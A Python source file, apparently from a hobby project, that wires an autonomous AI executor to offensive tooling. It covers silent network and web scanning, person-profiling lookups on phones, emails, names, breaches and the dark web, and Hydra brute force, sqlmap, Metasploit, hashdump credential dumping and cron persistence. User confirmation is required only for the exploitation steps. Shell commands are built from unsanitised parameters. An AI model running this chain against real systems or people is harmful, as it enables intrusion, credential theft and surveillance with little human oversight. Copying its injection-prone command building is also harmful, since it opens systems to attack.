"""
Unified tool bridge for T's autonomous executor.
Maps logical tool names → actual async functions across all modules.
Provides risk level for each tool so the executor knows when to confirm.
"""

import re
from typing import AsyncIterator
from core.logger import get_logger

log = get_logger("autonomous.tool_bridge")


# ── Risk levels ────────────────────────────────────────────────────────────────
# LOW/MEDIUM  → run silently (no confirmation)
# HIGH        → confirm with user before running
# CRITICAL    → confirm with user before running + extra warning

TOOL_RISK: dict[str, str] = {
    # Network recon — all silent
    "nmap_quick":        "LOW",
    "nmap_full":         "LOW",
    "nmap_scripts":      "LOW",
    "ping":              "LOW",
    "whois":             "LOW",
    "dig":               "LOW",
    "traceroute":        "LOW",
    "http_fingerprint":  "LOW",
    "fetch_page":        "LOW",
    "fetch_url":         "LOW",
    "web_search":        "LOW",
    "get_news":          "LOW",
    # Web enumeration — silent
    "vm_subfinder":      "LOW",
    "vm_amass":          "LOW",
    "vm_theharvester":   "LOW",
    "vm_whatweb":        "LOW",
    "vm_searchsploit":   "LOW",
    "vm_wafw00f":        "LOW",
    # Active scanning — silent (generates network traffic, no exploitation)
    "vm_ffuf":           "MEDIUM",
    "vm_gobuster":       "MEDIUM",
    "vm_nikto":          "MEDIUM",
    "vm_nuclei":         "MEDIUM",
    "vm_masscan":        "MEDIUM",
    "vm_wpscan":         "MEDIUM",
    # Intel / OSINT — all silent
    "intel_phone":       "LOW",
    "intel_username":    "LOW",
    "intel_email":       "LOW",
    "intel_name":        "LOW",
    "intel_breach":      "LOW",
    "intel_darkweb":     "LOW",
    "intel_shodan":      "LOW",
    "intel_org":         "LOW",
    # Exploitation — always confirm
    "vm_metasploit":     "HIGH",
    "vm_hydra":          "HIGH",
    "vm_sqlmap":         "HIGH",
    "vm_exploit":        "HIGH",
    "vm_privesc":        "HIGH",
    "vm_flag_search":    "MEDIUM",
    "vm_post_exploit":   "HIGH",
    # Credential extraction — always confirm
    "vm_cred_dump":      "CRITICAL",
    "vm_hashdump":       "CRITICAL",
    "vm_persistence":    "CRITICAL",
    # Report — silent
    "generate_report":   "LOW",
    # System tools — silent reads
    "get_processes":     "LOW",
    "system_info":       "LOW",
    "list_directory":    "LOW",
    "read_file":         "LOW",
    "screenshot":        "LOW",
}


def get_risk(tool: str) -> str:
    return TOOL_RISK.get(tool, "MEDIUM")


def requires_confirmation(tool: str) -> bool:
    return get_risk(tool) in ("HIGH", "CRITICAL")


# ── Tool executor ──────────────────────────────────────────────────────────────

async def run_tool(tool: str, params: dict, target: str = "") -> AsyncIterator[str]:
    """
    Execute a tool by name. Yields output lines.
    Bridges into all T modules: agents/tools, offensive, intel, vm.
    """
    # Fill in target if not explicitly in params
    if target and not params.get("target") and not params.get("host"):
        if tool in ("nmap_quick", "nmap_full", "nmap_scripts", "ping",
                    "traceroute", "http_fingerprint", "vm_nuclei", "vm_nikto",
                    "vm_masscan", "vm_wafw00f", "vm_whatweb"):
            params = {"target": target, **params}
        elif tool in ("vm_ffuf", "vm_gobuster", "vm_wpscan"):
            if not params.get("url"):
                params = {"url": f"http://{target}", **params}
        elif tool in ("whois", "dig", "vm_subfinder", "vm_amass",
                      "vm_theharvester"):
            if not params.get("domain"):
                params = {"domain": target, **params}

    # ── Network / system tools from agents/tools.py ───────────────────────────
    if tool in ("nmap_quick", "nmap_full", "ping", "whois", "dig",
                "traceroute", "http_fingerprint", "fetch_page", "fetch_url",
                "web_search", "get_news", "get_processes", "system_info",
                "list_directory", "read_file", "screenshot"):
        from agents.tools import get_tool
        t = get_tool(tool)
        if t:
            try:
                result = await t.fn(**params)
                for line in result.splitlines():
                    yield line
            except Exception as e:
                yield f"[ERROR] {tool}: {e}"
        else:
            yield f"[ERROR] Tool not found: {tool}"
        return

    # ── VM-based offensive tools ───────────────────────────────────────────────
    from offensive.vm_bridge import vm

    if tool == "nmap_scripts":
        flags = params.get("flags", "-sC -sV")
        async for l in vm.run(f"nmap {flags} {params.get('target', target)}", timeout=120): yield l

    elif tool == "vm_subfinder":
        d = params.get("domain", target)
        async for l in vm.run(f"subfinder -d {d} -silent 2>/dev/null", timeout=120): yield l

    elif tool == "vm_amass":
        d = params.get("domain", target)
        async for l in vm.run(f"amass enum -passive -d {d} 2>/dev/null | head -50", timeout=180): yield l

    elif tool == "vm_theharvester":
        d = params.get("domain", target)
        async for l in vm.run(f"theHarvester -d {d} -b google,bing,yahoo -l 50 2>/dev/null", timeout=90): yield l

    elif tool == "vm_ffuf":
        url = params.get("url", f"http://{target}/FUZZ")
        wl  = params.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
        async for l in vm.run(f"ffuf -u {url} -w {wl} -mc 200,301,302,403 -c -s 2>/dev/null", timeout=120): yield l

    elif tool == "vm_gobuster":
        url = params.get("url", f"http://{target}")
        wl  = params.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
        async for l in vm.run(f"gobuster dir -u {url} -w {wl} -q 2>/dev/null", timeout=120): yield l

    elif tool == "vm_nikto":
        t2 = params.get("target", target)
        async for l in vm.run(f"nikto -h {t2} -nointeractive 2>/dev/null", timeout=180): yield l

    elif tool == "vm_nuclei":
        t2   = params.get("target", target)
        tags = params.get("tags", "cve,rce,sqli,xss,misconfig")
        async for l in vm.run(f"nuclei -u {t2} -tags {tags} -silent 2>/dev/null", timeout=300): yield l

    elif tool == "vm_masscan":
        t2    = params.get("target", target)
        ports = params.get("ports", "1-65535")
        rate  = params.get("rate", "1000")
        async for l in vm.run(f"sudo masscan {t2} -p{ports} --rate={rate} 2>/dev/null", timeout=300): yield l

    elif tool == "vm_wpscan":
        url = params.get("url", f"http://{target}")
        async for l in vm.run(f"wpscan --url {url} --enumerate u,vp --no-banner 2>/dev/null", timeout=120): yield l

    elif tool == "vm_searchsploit":
        q = params.get("query", target)
        async for l in vm.run(f"searchsploit {q} 2>/dev/null", timeout=30): yield l

    elif tool == "vm_whatweb":
        t2 = params.get("target", target)
        async for l in vm.run(f"whatweb -a 3 {t2} 2>/dev/null", timeout=30): yield l

    elif tool == "vm_wafw00f":
        url = params.get("url", f"http://{target}")
        async for l in vm.run(f"wafw00f {url} 2>/dev/null", timeout=20): yield l

    elif tool == "vm_hydra":
        t2      = params.get("target", target)
        service = params.get("service", "ssh")
        user    = params.get("user", "admin")
        wl      = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        async for l in vm.run(f"hydra -l {user} -P {wl} {service}://{t2} -t 4 -q 2>/dev/null", timeout=300): yield l

    elif tool == "vm_sqlmap":
        url   = params.get("url", f"http://{target}")
        extra = params.get("extra", "--batch --level=2 --risk=2")
        async for l in vm.run(f"sqlmap -u '{url}' {extra} 2>/dev/null", timeout=300): yield l

    elif tool == "vm_metasploit":
        module  = params.get("module", "")
        options = " ".join(f"set {k} {v}" for k, v in params.get("options", {}).items())
        if not module:
            yield "[ERROR] Metasploit module not specified"
            return
        cmd = f"msfconsole -q -x 'use {module}; {options}; run; exit' 2>/dev/null"
        async for l in vm.run(cmd, timeout=300): yield l

    elif tool == "vm_flag_search":
        # Search for CTF flags on a compromised system via active session
        session = params.get("session", "1")
        cmd = (
            f"msfconsole -q -x '"
            f"sessions -i {session}; "
            f"shell -c \"find / -name user.txt -o -name root.txt 2>/dev/null | "
            f"xargs cat 2>/dev/null\"; exit' 2>/dev/null"
        )
        async for l in vm.run(cmd, timeout=60): yield l

    elif tool == "vm_privesc":
        session = params.get("session", "1")
        cmd = (
            f"msfconsole -q -x '"
            f"use post/multi/recon/local_exploit_suggester; "
            f"set SESSION {session}; run; exit' 2>/dev/null"
        )
        async for l in vm.run(cmd, timeout=120): yield l

    elif tool == "vm_post_exploit":
        session = params.get("session", "1")
        cmd = (
            f"msfconsole -q -x '"
            f"sessions -i {session}; "
            f"getuid; sysinfo; ipconfig; exit' 2>/dev/null"
        )
        async for l in vm.run(cmd, timeout=30): yield l

    elif tool == "vm_cred_dump":
        session = params.get("session", "1")
        cmd = f"msfconsole -q -x 'sessions -i {session}; hashdump; exit' 2>/dev/null"
        async for l in vm.run(cmd, timeout=30): yield l

    elif tool == "vm_hashdump":
        session = params.get("session", "1")
        async for l in vm.run(f"msfconsole -q -x 'sessions -i {session}; hashdump; exit' 2>/dev/null", timeout=30): yield l

    elif tool == "vm_persistence":
        session = params.get("session", "1")
        cmd = (
            f"msfconsole -q -x '"
            f"use post/linux/manage/cron_persistence; "
            f"set SESSION {session}; run; exit' 2>/dev/null"
        )
        async for l in vm.run(cmd, timeout=60): yield l

    # ── Intel tools ────────────────────────────────────────────────────────────
    elif tool == "intel_phone":
        from intel.person import profile_phone
        async for l in profile_phone(params.get("query", target)): yield l

    elif tool == "intel_username":
        from intel.person import profile_username
        async for l in profile_username(params.get("query", target)): yield l

    elif tool == "intel_email":
        from intel.person import profile_email
        async for l in profile_email(params.get("query", target)): yield l

    elif tool == "intel_name":
        from intel.person import profile_name
        q = params.get("query", target)
        parts = q.split(" ", 1)
        async for l in profile_name(parts[0], parts[1] if len(parts) > 1 else ""): yield l

    elif tool == "intel_breach":
        from intel.breach import check_hibp, search_paste_sites
        q = params.get("query", target)
        async for l in check_hibp(q): yield l
        async for l in search_paste_sites(q): yield l

    elif tool == "intel_darkweb":
        from intel.darkweb import tor_search
        async for l in tor_search(params.get("query", target)): yield l

    elif tool == "intel_shodan":
        from intel.org import shodan_footprint
        async for l in shodan_footprint(params.get("domain", target)): yield l

    elif tool == "intel_org":
        from intel.org import full_org_footprint
        async for l in full_org_footprint(params.get("domain", target)): yield l

    elif tool == "generate_report":
        # Handled by executor — yields nothing here
        yield "[REPORT] Report generation triggered."

    else:
        yield f"[ERROR] Unknown autonomous tool: {tool}"


def all_tools() -> list[str]:
    return list(TOOL_RISK.keys())
